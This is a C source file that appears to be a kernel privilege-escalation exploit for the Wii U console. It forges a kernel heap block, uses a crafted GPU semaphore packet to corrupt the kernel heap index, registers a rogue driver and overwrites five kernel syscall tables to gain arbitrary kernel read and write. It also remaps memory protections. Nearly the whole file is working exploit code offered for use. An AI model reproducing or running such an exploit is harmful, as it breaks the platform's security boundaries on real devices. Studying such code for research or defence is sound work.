#include "loader.h"

void _start()
{

	asm volatile(
		"lis %r1, 0x1ab5 ;"
		"ori %r1, %r1, 0xd138 ;"

	);

	char buf[200];

	/* Get a handle to coreinit.rpl and gx2.rpl */
	unsigned int coreinit_handle, gx2_handle, vpad_handle;
	OSDynLoad_Acquire("coreinit.rpl", &coreinit_handle);
	OSDynLoad_Acquire("gx2.rpl", &gx2_handle);
	OSDynLoad_Acquire("vpad.rpl", &vpad_handle);

	/* Misc functions */
	OSDynLoad_FindExport(coreinit_handle, 0, "OSGetCoreId", &OSGetCoreId);
	OSDynLoad_FindExport(coreinit_handle, 0, "__PPCExit", &__PPCExit);
	OSDynLoad_FindExport(coreinit_handle, 0, "_Exit", &_Exit);

	/* Memory functions */
	OSDynLoad_FindExport(coreinit_handle, 0, "DCFlushRange", &DCFlushRange);
	OSDynLoad_FindExport(coreinit_handle, 0, "DCInvalidateRange", &DCInvalidateRange);
	OSDynLoad_FindExport(coreinit_handle, 0, "DCTouchRange", &DCTouchRange);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSEffectiveToPhysical", &OSEffectiveToPhysical);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSAllocFromSystem", &OSAllocFromSystem);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSFreeToSystem", &OSFreeToSystem);
	OSDynLoad_FindExport(coreinit_handle, 0, "memset", &memset);
	OSDynLoad_FindExport(coreinit_handle, 0, "memcpy", &memcpy);

	/* OSScreen functions */
	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenPutFontEx", &OSScreenPutFontEx);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenClearBufferEx", &OSScreenClearBufferEx);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenInit", &OSScreenInit);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenGetBufferSizeEx", &OSScreenGetBufferSizeEx);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenSetBufferEx", &OSScreenSetBufferEx);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenFlipBuffersEx", &OSScreenFlipBuffersEx);

	/* OS thread functions */
	OSDynLoad_FindExport(coreinit_handle, 0, "OSCreateThread", &OSCreateThread);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSResumeThread", &OSResumeThread);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSGetThreadAffinity", &OSGetThreadAffinity);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSGetCurrentThread", &OSGetCurrentThread);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSExitThread", &OSExitThread);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSJoinThread", &OSJoinThread);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSIsThreadTerminated", &OSIsThreadTerminated);

	/* GX2 functions */
	OSDynLoad_FindExport(gx2_handle, 0, "GX2Init", &GX2Init);
	OSDynLoad_FindExport(gx2_handle, 0, "GX2GetMainCoreId", &GX2GetMainCoreId);
	OSDynLoad_FindExport(gx2_handle, 0, "GX2Shutdown", &GX2Shutdown);
	OSDynLoad_FindExport(gx2_handle, 0, "GX2Flush", &GX2Flush);
	OSDynLoad_FindExport(gx2_handle, 0, "GX2DirectCallDisplayList", &GX2DirectCallDisplayList);

	/* IM functions */
	OSDynLoad_FindExport(coreinit_handle, 0, "IM_Open", &IM_Open);
	OSDynLoad_FindExport(coreinit_handle, 0, "IM_Close", &IM_Close);
	OSDynLoad_FindExport(coreinit_handle, 0, "IM_SetDeviceState", &IM_SetDeviceState);

	/* VPAD functions */
	OSDynLoad_FindExport(vpad_handle, 0, "VPADRead", &VPADRead);

	/* Kernel syscalls */
	OSDriver_Register = (uint32_t (*)(char*, uint32_t, void*, void*))0x010277B8;
	OSDriver_Deregister = (uint32_t (*)(char*, uint32_t))0x010277C4;
	OSDriver_CopyToSaveArea = (uint32_t (*)(char*, uint32_t, void*, uint32_t))0x010277DC;
	
	void *mem = OSAllocFromSystem(0x100, 64);
	memset(mem, 0, 0x100);

	int fd = IM_Open();
	IM_SetDeviceState(fd, mem, 3, 0, 0);
	IM_Close(fd);

	OSFreeToSystem(mem);

	wait();
	wait();

	/* Our next kernel allocation (<= 0x4C) will be here */
	OSDriver *driverhax =  (OSDriver*)OSAllocFromSystem(sizeof(OSDriver), 4);

	/* Setup our fake heap block in the userspace at 0x1F200014 */
	heap_block_t *heap_blk = (heap_block_t*)0x1F200014;
	heap_blk->addr = (uint32_t)driverhax;
	heap_blk->size = -0x4c;
	heap_blk->prev_idx = -1;
	heap_blk->next_idx = -1;

	DCFlushRange(heap_blk, 0x10);

	/* Crafting our GPU packet */
	uint32_t *pm4_packet = (uint32_t *)OSAllocFromSystem(32, 32);
	pm4_packet[0] = make_pm4_type3_packet_header(MEM_SEMAPHORE, 2);	// 0xC0013900 | PM4 type3 packet header for Semaphore operations
	pm4_packet[1] = KERNEL_HEAP_PHYS + FIRST_INDEX_OFFSET;   		// 0x1B800008 | Physical Address of the "semaphore"
	pm4_packet[2] = SIGNAL_SEMAPHORE;								// 0xC0000000 | Signal = semaphore->count++;
	for (int i = 0; i < 5; ++i)
	{
		pm4_packet[3 + i] = 0x80000000;
	}

	DCFlushRange(pm4_packet, 32);

	OSContext *thread1 = (OSContext*)OSAllocFromSystem(0x1000, 32);
	uint32_t *tdstack1 = (uint32_t *)OSAllocFromSystem(0x1000, 4);

	OSContext *thread2 = (OSContext*)OSAllocFromSystem(0x1000, 32);
	uint32_t *tdstack2 = (uint32_t *)OSAllocFromSystem(0x1000, 4);

	/* *** Shutdown GX2 on its running core *** */
	OSCreateThread(thread1, GX2Shutdown, 0, NULL, tdstack1 + 0x400, 0x1000, 0, (1 << GX2GetMainCoreId()) | 0x10);
	OSResumeThread(thread1);
	wait();

	/* Incrememnt heap_ctx->first_index by 0x02000000 (L197) */
	OSCreateThread(thread2, main_code, 1, pm4_packet, tdstack2 + 0x400, 0x1000, 0, 2 | 0x10);
	OSResumeThread(thread2);

	/* Waiting for the thread to exit */
	int rc;
	OSJoinThread(thread2, &rc);

	uint32_t *syscalls = OSAllocFromSystem(20, 4);
	syscalls[0] = KERNEL_CODE_READ;		// Syscall 0x34
	syscalls[1] = KERNEL_CODE_WRITE;	// Syscall 0x35
	syscalls[2] = 0x01067544;			// Syscall 0x36 (blr) nullsub_1
	syscalls[3] = 0x01067544;			// Syscall 0x37 (blr) nullsub_1
	DCFlushRange(syscalls, 20);

	/* Register DRVHAX (should be in userspace now) */
	char drvname[6] = {'D', 'R', 'V', 'H', 'A', 'X'};
	OSDriver_Register(drvname, 6, NULL, NULL);

	/* Patch Syscall Table 1 */
	driverhax->save_area = KERNEL_SYSCALL_TABLE_1 + (0x34*4);
	OSDriver_CopyToSaveArea(drvname, 6, syscalls, 16);

	/* Patch Syscall Table 2 */
	driverhax->save_area = KERNEL_SYSCALL_TABLE_2 + (0x34*4);
	OSDriver_CopyToSaveArea(drvname, 6, syscalls, 16);

	/* Patch Syscall Table 3 */
	driverhax->save_area = KERNEL_SYSCALL_TABLE_3 + (0x34*4);
	OSDriver_CopyToSaveArea(drvname, 6, syscalls, 16);

	/* Patch Syscall Table 4 */
	driverhax->save_area = KERNEL_SYSCALL_TABLE_4 + (0x34*4);
	OSDriver_CopyToSaveArea(drvname, 6, syscalls, 16);

	/* Patch Syscall Table 5 */
	driverhax->save_area = KERNEL_SYSCALL_TABLE_5 + (0x34*4);
	OSDriver_CopyToSaveArea(drvname, 6, syscalls, 16);

	/* Revert back kernel changes */
	kern_write((void*)KERNEL_HEAP_VIRT + FIRST_INDEX_OFFSET, 0);
	kern_write((void*)KERNEL_DRIVER_PTR, (uint32_t)driverhax->next_drv);

	/* Map R-X memory as RW- elsewhere */
//	kern_write((uint32_t*)KERNEL_ADDRESS_TABLE + 0x10, 0xA0000000); // Effective Address
//	kern_write((uint32_t*)KERNEL_ADDRESS_TABLE + 0x11, 0x40000000); // Size
	kern_write((uint32_t*)KERNEL_ADDRESS_TABLE + 0x12, 0x31000000); // Physical Address
	kern_write((uint32_t*)KERNEL_ADDRESS_TABLE + 0x13, 0x28305800); // Flags (Same as MEM2)

	print("Press the HOME button to exit !");

	VPADData vpad_data;
	int error = -1;

	while(1)
	{

		VPADRead(0, &vpad_data, 1, &error);
		if (vpad_data.btn_hold & BUTTON_HOME)
		{
			break;
		}
	}

	for (int i = 0; i < 2; i++)
	{
		fillScreen(0, 0, 0, 0);
		flipBuffers();
	}

	_Exit();

	while(1);

}


void main_code(uint32_t useless, uint32_t *packet)
{

	wait();

	GX2Init(NULL);
	ScreenInit();

	GX2DirectCallDisplayList(packet, 32);
	GX2DirectCallDisplayList(packet, 32);
	GX2Flush();

	OSExitThread(0);

}


void wait()
{
	unsigned int t1 = 0x08FFFFFF;
	while(t1--) ;
}
/* Init the screen */
void ScreenInit()
{


	OSScreenInit();
	OSScreenSetBufferEx(0, (void *)0xF4000000);
	OSScreenSetBufferEx(1, (void *)0xF4000000 +  OSScreenGetBufferSizeEx(0));

	for (int ii = 0; ii < 2; ii++)
	{
		fillScreen(64,64,64,255);
		flipBuffers();
	}

}

/* Clear the screen */
void ScreenClear()
{
	OSScreenClearBufferEx(1, COLOR_CONSTANT);
	OSScreenFlipBuffersEx(1);
	sy = 0;
}


void print(char *buf)
{
	for(int i=0;i<2;i++)
	{
		drawString(0,sy,buf);
		flipBuffers();
	}

	sy++;
}

/* Chadderz's kernel write function */
void __attribute__ ((noinline)) kern_write(void *addr, uint32_t value)
{
	asm volatile (
        "li 3,1\n"
        "li 4,0\n"
        "mr 5,%1\n"
        "li 6,0\n"
        "li 7,0\n"
        "lis 8,1\n"
        "mr 9,%0\n"
        "mr %1,1\n"
        "li 0,0x3500\n"
        "sc\n"
        "nop\n"
        "mr 1,%1\n"
        :
        :	"r"(addr), "r"(value)
        :	"memory", "ctr", "lr", "0", "3", "4", "5", "6", "7", "8", "9", "10",
            "11", "12"
    );
}

uint32_t make_pm4_type3_packet_header(uint32_t opcode, uint32_t count)
{
	uint32_t hdr = 0;					// bit[7:1]   = reserved | bit0 = predicate (should be 0)
	hdr += (3 << 30); 					// bit[31:30] = 3 -> type3 header
	hdr += ((count-1) << 16);			// bit[29:16] = (Number of DWORD) - 1
	hdr += (opcode << 8);				// bit[15:8]  = OPCODE			

	return hdr;
	
}